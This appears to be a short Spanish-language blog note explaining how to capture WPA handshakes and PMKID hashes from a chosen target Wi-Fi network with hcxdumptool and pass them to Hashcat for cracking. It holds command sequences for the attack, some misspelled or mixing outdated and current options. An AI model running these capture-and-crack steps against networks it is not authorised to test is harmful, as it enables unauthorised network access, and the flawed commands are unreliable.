---
title: "Capturar handshakes y ataques PMKID con Hcxdumptool"
date: 2025-02-16T13:16:01-03:00
tags: ['hacking']
---
Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.

Es importante tener la última versión de `hcxdumptool`: 

Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.  Esto fue mencionado en el changelog.

### -i wlan0mon --> as mentioned in help it is not recommended to run hcxdumptool on a virtual monitor interface!!!!!! Do not use scripts like airmon-ng to set monitor mode before you run hcxdumptool, because hcxdumtool set  its own monitor mode!!!!!

### Cadena de scripts que hay que usar: 
`hcxdumptool -> hcxpcapngtool -> hcxhashtool (additional hcxpsktool/hcxeiutool) -> Hashcat`

```bash
sudo su
ifconfig # Ver nombre de tu interfaz WiFi.
airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto 
echo "BSSID" > myfilter.txt
hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1
hcxdumptool -o capture.pcap -i wlp1s0 
hcxpcaptool -m pmkid_hash.txt capture.pcap
```

En la versión 6.3.0 las opciones fueron reemplazadas por:

`-o` fue reemplazado por `-w`
`--filterlist=f2-text.txt` fue reemplazado por `--bpf`
`--filtermode=2` fue reemplazado por `--bpf`




```bash
git clone https://github.com/ZerBea/hcxdumptool
make
sudo make install
hcxdumptool -I 
hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status=15

```


https://miloserdov.org/?p=7801
